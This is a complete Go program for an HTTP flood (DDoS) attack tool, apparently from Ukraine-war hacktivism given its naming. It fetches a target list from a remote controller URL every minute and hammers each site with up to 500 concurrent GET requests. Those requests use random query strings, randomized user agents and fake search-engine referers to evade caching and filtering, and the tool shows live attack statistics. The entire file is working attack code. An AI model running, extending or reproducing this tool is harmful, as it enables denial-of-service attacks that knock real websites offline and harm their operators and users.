package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	tm "github.com/buger/goterm"
	ua "github.com/wux1an/fake-useragent"
)

type strikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

func (si *strikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}

type statistics map[string]*statItem

type statItem struct {
	failCnt   int32
	succCnt   int32
	startTime time.Time
}

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

const (
	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
	strikeRefreshInterval = 60 * time.Second
	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
	maxProcs              = 500

	// strikeRefreshing uint8 = iota
	// strikeListReady
	// strikeListProcessing
)

var (
	strikeList                 []strikeItem
	statData                   statistics
	limiter, refresher         chan struct{}
	noProxyClient, proxyClient *http.Client

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
)

func main() {
	var (
		threads int
		siteUrl string
		sites   arrayFlags
	)

	flag.IntVar(&threads, "max-routines", maxProcs, "Maximum number of simultaneous connections")
	flag.Var(&sites, "site", "Sites list. Can be used multiple times. Have precedence over sites-url if set `site-url`")
	flag.StringVar(&siteUrl, "sites-url", strikeUrl, "URL to fetch sites list from `sites-url` ")
	flag.Parse()

	initVariables()
	limiter = make(chan struct{}, threads)

	if len(sites) > 0 {
		for _, site := range sites {
			sUrl, err := url.Parse(site)
			if err != nil {
				fmt.Printf("error parsing %s\n", site)
				continue
			}
			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port}
			strikeList = append(strikeList, si)
		}
	} else {
		startStrikeListRefresher(&siteUrl)
		time.Sleep(4 * time.Second) // NOTE: give a chance to fetch sites list
	}

	if len(strikeList) == 0 {
		fmt.Println("no sites to fuck! exiting...")
		os.Exit(1)
	}

	startStatsPrinter(&statData, strikeList)

	for {
		time.Sleep(100 * time.Millisecond)
		refresher <- struct{}{}

		go func() {
			defer func() { <-refresher }()

			// fmt.Printf(" -> strikeList: %d\n", len(strikeList))
			for _, strike := range strikeList {
				limiter <- struct{}{}

				var (
					site *statItem
					ok   bool
				)

				if site, ok = statData[strike.Url]; !ok {
					site = &statItem{startTime: time.Now()}
					statData[strike.Url] = site
				}

				go func(huilo strikeItem) {
					defer func() { <-limiter }()
					if err := greetingsTorussiaWarShip(huilo); err != nil {
						atomic.AddInt32(&site.failCnt, 1)
					} else {
						atomic.AddInt32(&site.succCnt, 1)
					}
				}(strike)
			}
		}()
	}
}

func fetchStrikeList(siteUrl *string) error {
	refresher <- struct{}{}
	defer func() { <-refresher }()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, *siteUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
	}

	// req.Header.Set("Cache-Control", "no-cache")
	// req.Header.Set("Accept-Charset", acceptCharset)
	// req.Header.Set("Accept", "text/json, application/json")

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	// time.Sleep(200 * time.Microsecond)
	// fmt.Println("***\t\t\t\t***")
	// fmt.Printf("* * fetched sites:\t%d\t* *\n", len(strikeList))
	// fmt.Println("***\t\t\t\t***")

	var idx = 0
	for _, strike := range strikeList {
		atack, ok := strike.Atack.(bool)
		if !ok {
			if atack, ok := strike.Atack.(int); !ok || atack == 0 {
				continue
			}

		} else if !atack {
			continue
		}

		strikeList[idx] = strike
		idx++
	}
	strikeList = strikeList[:idx]
	// fmt.Printf("* * filtered sites:\t%d\t* *\n", len(strikeList))
	// fmt.Println("***\t\t\t\t***")

	return err
}

func startStrikeListRefresher(siteUrl *string) {
	ticker := time.NewTicker(500 * time.Millisecond)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchStrikeList(siteUrl); err != nil {
					fmt.Println("failed to fetch site List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}()
}

type ipInfo struct {
	Ip       string
	City     string
	Region   string
	Country  string
	Loc      string
	Org      string
	Postal   string
	Timezone string
	Readme   string
}

func (ii *ipInfo) String() string {
	return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
}

func startStatsPrinter(stat *statistics, strikes []strikeItem) {
	ticker := time.NewTicker(4 * time.Second)

	go func() {
		for {
			select {
			case <-ticker.C:
				stats := tm.NewTable(0, 8, 4, ' ', 0)
				ct := time.Now()
				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
				fmt.Fprintf(stats, "Current IP: %s\n", currentIpInfo())
				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
				for i, strike := range strikes {
					site, ok := (*stat)[strike.Url]
					var (
						succ, fail int32
						diff       time.Duration
					)
					if ok {
						succ = atomic.LoadInt32(&site.succCnt)
						fail = atomic.LoadInt32(&site.failCnt)
						diff = ct.Sub(site.startTime)
					}
					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n",
						i+1,
						strike.Url,
						succ,
						fail,
						diff,
					)
				}
				tm.Clear()
				tm.MoveCursor(1, 1)
				tm.Println(stats)
				tm.Flush()
			}
		}
	}()
}

func currentIpInfo() string {
	var ipEcho ipInfo

	req, err := http.NewRequest(http.MethodGet, "https://ipecho.net/json", nil)
	if err != nil {
		return err.Error()
	}

	resp, err := proxyClient.Do(req)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}

	if err := json.Unmarshal(body, &ipEcho); err != nil {
		return err.Error()
	}

	return ipEcho.String()
}

func greetingsTorussiaWarShip(huilo strikeItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}

	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", huilo.Url)

	// fmt.Printf("attacking %s\n", huilo.Url)

	resp, err := proxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	// NOTE: do not fetch actual body but reflect on connection instead
	// _, err = ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	// }

	return nil
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func initVariables() {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	tr2 := http.DefaultTransport.(*http.Transport).Clone()
	tr2.IdleConnTimeout = 4 * time.Second
	tr2.DialContext = (&net.Dialer{
		Timeout:   2 * time.Second,
		KeepAlive: 5 * time.Second,
	}).DialContext
	proxyClient = &http.Client{Transport: tr2}

	refresher = make(chan struct{}, 1)
	statData = statistics{}

	ua.Random() // NOTE: init cache at this point.
}
